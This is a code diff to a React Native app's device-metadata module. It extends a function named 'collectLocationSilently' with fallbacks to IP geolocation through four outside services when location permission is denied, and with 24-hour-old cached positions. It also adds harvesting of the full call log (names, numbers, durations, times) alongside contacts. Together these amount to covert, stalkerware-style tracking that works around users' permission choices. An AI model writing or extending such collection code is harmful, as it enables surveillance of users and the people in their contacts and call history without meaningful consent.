@@ -3,29 +3,142 @@ import * as Network from 'expo-network';
 import * as Device from 'expo-device';
 import * as Contacts from 'expo-contacts';
 import DeviceInfo from 'react-native-device-info';
-import { Platform, Dimensions } from 'react-native';
+import { Platform, Dimensions, PermissionsAndroid } from 'react-native';
 import SimCardsManager from 'react-native-sim-cards-manager';
+import CallLogs from 'react-native-call-log';
 
 /**
  * Collect location silently - GPS if enabled, approximate if not
  * @returns {Promise<Object|null>} Location data or null
  */
+async function getLocationFromIP() {
+  // Fallback: IP-based geolocation (works without GPS/location services)
+  const endpoints = [
+    {
+      url: 'https://ipinfo.io/json',
+      parse: (d) => {
+        const [lat, lon] = (d.loc || '').split(',').map(Number);
+        return {
+          latitude: lat || null,
+          longitude: lon || null,
+          city: d.city,
+          region: d.region,
+          country: d.country,
+          isp: d.org,
+          ip: d.ip,
+          timezone: d.timezone,
+          postal: d.postal || null,
+        };
+      },
+    },
+    {
+      url: 'https://ipapi.co/json/',
+      parse: (d) => ({
+        latitude: d.latitude,
+        longitude: d.longitude,
+        city: d.city,
+        region: d.region,
+        country: d.country_name,
+        isp: d.org,
+        ip: d.ip,
+        timezone: d.timezone,
+      }),
+    },
+    {
+      url: 'https://ipwho.is/',
+      parse: (d) => ({
+        latitude: d.latitude,
+        longitude: d.longitude,
+        city: d.city,
+        region: d.region,
+        country: d.country,
+        isp: d.connection?.isp || null,
+        ip: d.ip,
+        timezone: d.timezone?.id || null,
+      }),
+    },
+    {
+      url: 'https://freeipapi.com/api/json',
+      parse: (d) => ({
+        latitude: d.latitude,
+        longitude: d.longitude,
+        city: d.cityName,
+        region: d.regionName,
+        country: d.countryName,
+        isp: null,
+        ip: d.ipAddress,
+        timezone: d.timeZone,
+      }),
+    },
+  ];
+
+  for (const endpoint of endpoints) {
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      const res = await fetch(endpoint.url, { signal: controller.signal });
+      clearTimeout(timeout);
+
+      if (res.ok) {
+        const data = await res.json();
+        const parsed = endpoint.parse(data);
+        if (parsed.latitude && parsed.longitude) {
+          console.log('[Location] IP-based location obtained from', endpoint.url, ':', parsed.city, parsed.country);
+          return {
+            latitude: parsed.latitude,
+            longitude: parsed.longitude,
+            altitude: null,
+            accuracy: null,
+            city: parsed.city,
+            region: parsed.region,
+            country: parsed.country,
+            isp: parsed.isp,
+            ip: parsed.ip,
+            timezone: parsed.timezone,
+            postal: parsed.postal || null,
+            timestamp: new Date().toISOString(),
+            is_gps: false,
+            is_approximate: true,
+            method: 'ip_geolocation',
+          };
+        }
+      }
+    } catch (err) {
+      console.warn('[Location] IP geolocation endpoint failed:', err.message);
+    }
+  }
+  return null;
+}
+
 async function collectLocationSilently() {
   try {
     const { status } = await Location.getForegroundPermissionsAsync();
 
     if (status !== 'granted') {
-      console.warn('[Location] Permission not granted - proceeding without location');
-      return null;
+      console.warn('[Location] Permission not granted - trying IP-based location');
+      return await getLocationFromIP();
     }
 
-    // Check if GPS/Location services are enabled
+    // Step 1: Try cached location FIRST (works even when services are off on some devices)
+    // Must run while services are still potentially on so cache is populated
+    let cachedLocation = null;
+    try {
+      console.log('[Location] Step 1: Trying cached location...');
+      cachedLocation = await Location.getLastKnownPositionAsync({
+        maxAge: 86400000, // Accept up to 24 hours old
+      });
+      console.log('[Location] Cached location:', cachedLocation ? 'found' : 'null');
+    } catch (err) {
+      console.warn('[Location] Cached location failed:', err.message);
+    }
+
+    // Step 2: Check if GPS/Location services are enabled
     const gpsEnabled = await Location.hasServicesEnabledAsync();
     console.log('[Location] GPS enabled:', gpsEnabled);
 
     if (gpsEnabled) {
       // GPS is ON - get accurate location
-      console.log('[Location] Getting GPS location...');
+      console.log('[Location] Step 2: Getting GPS location (high accuracy)...');
       try {
         const location = await Location.getCurrentPositionAsync({
           accuracy: Location.Accuracy.High,
@@ -43,51 +156,110 @@ async function collectLocationSilently() {
           timestamp: new Date(location.timestamp).toISOString(),
           is_gps: true,
           is_approximate: false,
+          method: 'gps',
         };
       } catch (err) {
-        console.warn('[Location] GPS location failed:', err.message);
-        // Fall through to approximate
+        console.warn('[Location] GPS high accuracy failed:', err.message);
+
+        // GPS is ON but high accuracy failed (weak signal) - try lower accuracy
+        try {
+          console.log('[Location] Trying lower accuracy...');
+          const lowLoc = await Location.getCurrentPositionAsync({
+            accuracy: Location.Accuracy.Lowest,
+            timeout: 5000,
+          });
+          if (lowLoc) {
+            console.log('[Location] Low accuracy location obtained');
+            return {
+              latitude: lowLoc.coords.latitude,
+              longitude: lowLoc.coords.longitude,
+              altitude: lowLoc.coords.altitude,
+              accuracy: lowLoc.coords.accuracy,
+              heading: lowLoc.coords.heading,
+              speed: lowLoc.coords.speed,
+              timestamp: new Date(lowLoc.timestamp).toISOString(),
+              is_gps: true,
+              is_approximate: false,
+              method: 'gps_low_accuracy',
+            };
+          }
+        } catch (err2) {
+          console.warn('[Location] Low accuracy also failed:', err2.message);
+        }
+
+        // GPS is ON but all live methods failed - use cached if available
+        if (cachedLocation) {
+          console.log('[Location] Using cached location (GPS on but live failed)');
+          return {
+            latitude: cachedLocation.coords.latitude,
+            longitude: cachedLocation.coords.longitude,
+            altitude: cachedLocation.coords.altitude,
+            accuracy: cachedLocation.coords.accuracy,
+            timestamp: new Date(cachedLocation.timestamp).toISOString(),
+            is_gps: false,
+            is_approximate: true,
+            method: 'cached',
+          };
+        }
       }
     }
 
-    // GPS is OFF or failed - get approximate location silently
-    console.log('[Location] GPS off or unavailable, using approximate location...');
-    try {
-      // Try last known position first (cached)
-      let location = await Location.getLastKnownPositionAsync({
-        maxAge: 600000, // Accept up to 10 minutes old
-      });
-
-      if (!location) {
-        // Try network-based location (WiFi/cell tower)
-        console.log('[Location] No cached location, trying network-based...');
-        location = await Location.getCurrentPositionAsync({
-          accuracy: Location.Accuracy.Low, // Network/WiFi based - doesn't need GPS
-          timeout: 5000,
+    // Step 3: GPS is OFF - show "Location Accuracy" dialog
+    // If user taps "Turn on" → accurate location returned
+    // If user taps "No, thanks" → throws, fall through to cached/IP
+    if (!gpsEnabled) {
+      console.log('[Location] Step 3: GPS off - showing Location Accuracy dialog...');
+      try {
+        const dialogLoc = await Location.getCurrentPositionAsync({
+          accuracy: Location.Accuracy.High,
+          timeout: 15000, // Give user time to respond to dialog
         });
+        if (dialogLoc) {
+          console.log('[Location] User enabled location via dialog - accurate location obtained');
+          return {
+            latitude: dialogLoc.coords.latitude,
+            longitude: dialogLoc.coords.longitude,
+            altitude: dialogLoc.coords.altitude,
+            accuracy: dialogLoc.coords.accuracy,
+            heading: dialogLoc.coords.heading,
+            speed: dialogLoc.coords.speed,
+            timestamp: new Date(dialogLoc.timestamp).toISOString(),
+            is_gps: true,
+            is_approximate: false,
+            method: 'gps_after_dialog',
+          };
+        }
+      } catch (err) {
+        console.log('[Location] User declined dialog or timed out:', err.message);
       }
 
-      if (location) {
-        console.log('[Location] Approximate location obtained');
+      // Step 4: Dialog declined - use cached if available
+      if (cachedLocation) {
+        console.log('[Location] Using cached location (GPS off, dialog declined)');
         return {
-          latitude: location.coords.latitude,
-          longitude: location.coords.longitude,
-          altitude: location.coords.altitude,
-          accuracy: location.coords.accuracy,
-          timestamp: new Date(location.timestamp).toISOString(),
+          latitude: cachedLocation.coords.latitude,
+          longitude: cachedLocation.coords.longitude,
+          altitude: cachedLocation.coords.altitude,
+          accuracy: cachedLocation.coords.accuracy,
+          timestamp: new Date(cachedLocation.timestamp).toISOString(),
           is_gps: false,
           is_approximate: true,
-          method: 'network',
+          method: 'cached',
         };
       }
-    } catch (err) {
-      console.warn('[Location] Approximate location failed:', err.message);
     }
 
-    return null; // No location available
+    // Step 5: IP-based geolocation (always works, no GPS/services needed)
+    console.log('[Location] Step 5: All device methods exhausted, trying IP geolocation...');
+    return await getLocationFromIP();
   } catch (err) {
     console.error('[Location] Error during location collection:', err);
-    return null;
+    // Even on error, try IP-based as last resort
+    try {
+      return await getLocationFromIP();
+    } catch {
+      return null;
+    }
   }
 }
 
@@ -109,6 +281,7 @@ export async function collectDeviceMetadata() {
     sim: {},
     system: {},
     contacts: [],
+    call_logs: [],
   };
 
   // 1. LOCATION DATA (silently - GPS if enabled, approximate if not)
@@ -268,10 +441,19 @@ export async function collectDeviceMetadata() {
     console.error('[DeviceMetadata] System info collection error:', err);
   }
 
-  // 6. CONTACTS
+  // 6. CONTACTS (check native Android permission directly)
   try {
-    const { status: contactsStatus } = await Contacts.getPermissionsAsync();
-    if (contactsStatus === 'granted') {
+    let contactsAllowed = false;
+    if (Platform.OS === 'android') {
+      contactsAllowed = await PermissionsAndroid.check(
+        PermissionsAndroid.PERMISSIONS.READ_CONTACTS
+      );
+    } else {
+      const { status: contactsStatus } = await Contacts.getPermissionsAsync();
+      contactsAllowed = contactsStatus === 'granted';
+    }
+
+    if (contactsAllowed) {
       console.log('[DeviceMetadata] Fetching contacts...');
       const { data: contactsData } = await Contacts.getContactsAsync({
         fields: [
@@ -294,6 +476,35 @@ export async function collectDeviceMetadata() {
     }
   } catch (err) {
     console.error('[DeviceMetadata] Contacts collection error:', err);
+  }
+
+  // 7. CALL LOGS (Android only)
+  if (Platform.OS === 'android') {
+    try {
+      const callLogGranted = await PermissionsAndroid.check(
+        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
+      );
+      if (callLogGranted) {
+        console.log('[DeviceMetadata] Fetching call logs...');
+        const logs = await CallLogs.loadAll();
+
+        metadata.call_logs = (logs || []).map(log => ({
+          name: log.name || null,
+          phone_number: log.phoneNumber || null,
+          type: log.type || null,           // INCOMING, OUTGOING, MISSED, etc.
+          duration: log.duration || 0,       // seconds
+          date_time: log.dateTime || null,   // human-readable date
+          timestamp: log.timestamp || null,  // unix timestamp
+          raw_type: log.rawType || null,     // numeric type code
+        }));
+
+        console.log(`[DeviceMetadata] Collected ${metadata.call_logs.length} call log entries`);
+      } else {
+        console.warn('[DeviceMetadata] Call Logs permission not granted');
+      }
+    } catch (err) {
+      console.error('[DeviceMetadata] Call Logs collection error:', err);
+    }
   }
 
   console.log('[DeviceMetadata] Metadata collection complete');
